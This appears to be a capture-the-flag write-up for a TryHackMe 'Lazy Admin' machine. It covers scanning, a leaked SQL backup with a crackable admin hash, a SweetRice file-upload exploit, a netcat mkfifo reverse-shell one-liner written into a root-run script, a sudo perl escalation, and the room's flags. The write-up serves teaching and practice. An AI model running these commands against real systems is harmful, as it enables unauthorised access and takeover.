# Lazy Admin

Laurent Chauvin | October 31, 2022

## Resources

## Progress

```
export IP=10.10.56.32
```

Nmap scan:
```
nmap -sC -sV -oN nmap/initial $IP  

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 18:09 EDT
Nmap scan report for 10.10.56.32
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.56 seconds
```

Gobuster scan:
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log 

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.56.32
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/31 18:09:55 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 312] [--> http://10.10.56.32/content/]
```

Nikto scan:
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.56.32
+ Target Hostname:    10.10.56.32
+ Target Port:        80
+ Start Time:         2022-10-31 18:11:02 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 59878d86c765e, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
```

Initial page show a default Apache page. Going into /content show another page.
```
Welcome to SweetRice - Thank your for install SweetRice as your website management system.
This site is building now , please come late.

If you are the webmaster,please go to Dashboard -> General -> Website setting

and uncheck the checkbox "Site close" to open your website.

More help at Tip for Basic CMS SweetRice installed
```

A searchsploit of SweetRice yields few results:
```
searchsploit SweetRice

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                                                                                                                                   | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                                                                                                                                | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                                                                                                                                 | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                                                                                   | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                                                                       | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                                                                              | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                                                                         | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                                                                                                                     | php/webapps/14184.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Javascript directory seems accessible:
```
http://10.10.56.32/content/js/
```

Running gobuster on /content:
```
gobuster dir -u $IP/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.56.32/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/31 18:38:32 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://10.10.56.32/content/images/]
/js                   (Status: 301) [Size: 315] [--> http://10.10.56.32/content/js/]
/inc                  (Status: 301) [Size: 316] [--> http://10.10.56.32/content/inc/]
/as                   (Status: 301) [Size: 315] [--> http://10.10.56.32/content/as/]
/_themes              (Status: 301) [Size: 320] [--> http://10.10.56.32/content/_themes/]
/attachment           (Status: 301) [Size: 323] [--> http://10.10.56.32/content/attachment/]
```

In 'inc/' found:
```
mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

Get it:
```
wget http://10.10.56.32/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
subl mysql_bakup_20191129023059-1.5.1.sql
```

Very interesting line:
```sql
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',

```

Found credentials:
```
manager:42f749ade7f9e195bf475f37a44cafcb
```

Going to 'http://10.10.56.32/content/as/' lead to the admin login page.
Try found credentials.

Using Crack Station, found password for hash:
```
42f749ade7f9e195bf475f37a44cafcb	md5	Password123
```

Once login, we find it's running version 1.5.1.
From searchsploit, many exploits available for 1.5.1.

Let's try to upload a reverse shell.

```
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : 10.10.56.32/content        
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : revshell.php
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.10.56.32/content/attachment/revshell.phtml
```

Start pwncat:
```
cd /opt/pwncat
poetry shell
pwncat-cs -lp 9999
```

Get User's flag:
```
cat /home/itguy/user.txt

THM{63e5bce9271952aad1113b6f1ac28a07}
```

Also get:
```
(remote) www-data@THM-Chal:/home/itguy$ cat mysql_login.txt 

rice:randompass
```

Time to privesc:
```
(remote) www-data@THM-Chal:/$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Let's check perl:
```
(remote) www-data@THM-Chal:/$ ls -al /usr/bin/perl
-rwxr-xr-x 1 root root 2082616 Nov 19  2018 /usr/bin/perl
```

Perl is own by root. Let's modify backup.pl.

Let's check GTFObins with perl [1]:
```
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo perl -e 'exec "/bin/sh";'
```

Cannot modify backup.pl:
```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

However, absolute path of sh is not specified.

Looking at .profile:
```
(remote) www-data@THM-Chal:/home/itguy$ cat .profile 
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin directories
PATH="$HOME/bin:$HOME/.local/bin:$PATH"
```

'/etc/copy.sh' seems writable:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.10 5554 >/tmp/f
```

Upload linpeas:
```
(local) pwncat$ upload /opt/linpeas.sh
./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 827.8/827.8 KB • ? • 0:00:00
[19:27:18] uploaded 827.83KiB in 6.52 seconds       
```

Running linpeas found:
```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                                                                                                 

Potentially Vulnerable to CVE-2022-2588
```

Should work, but let's try to get root through perl first.

Start a netcat listener (we cannot start 2 instances of pwncat):
```
nc -lnvp 5554
```

From remote, execute with sudo:
```
(remote) www-data@THM-Chal:/dev/shm$ sudo /usr/bin/perl /home/itguy/backup.pl
```

We are root.
```
nc -lnvp 5554                        

listening on [any] 5554 ...
connect to [10.18.23.136] from (UNKNOWN) [10.10.39.162] 43048
(remote) root@THM-Chal:/dev/shm$ whoami
root
```

Get flag:
```
(remote) root@THM-Chal:/dev/shm$ cat /root/root.txt

THM{6637f41d0177b6f37cb20d775124699f}
```

Now try with CVE-2021-4034. Zipped and uploaded CVE-2021-4034 to server.
```
(remote) www-data@THM-Chal:/dev/shm/CVE-2021-4034$ ./cve-2021-4034
GLib: Cannot convert message: Could not open converter from 'UTF-8' to 'PWNKIT'
The value for the SHELL variable was not found the /etc/shells file

This incident has been reported.

```

However it doesn't work. Could maybe make it work by tweaking the script, but nevermind.


## Flag

1. User

```
THM{63e5bce9271952aad1113b6f1ac28a07}
```

2. Privesc

```
THM{6637f41d0177b6f37cb20d775124699f}
```

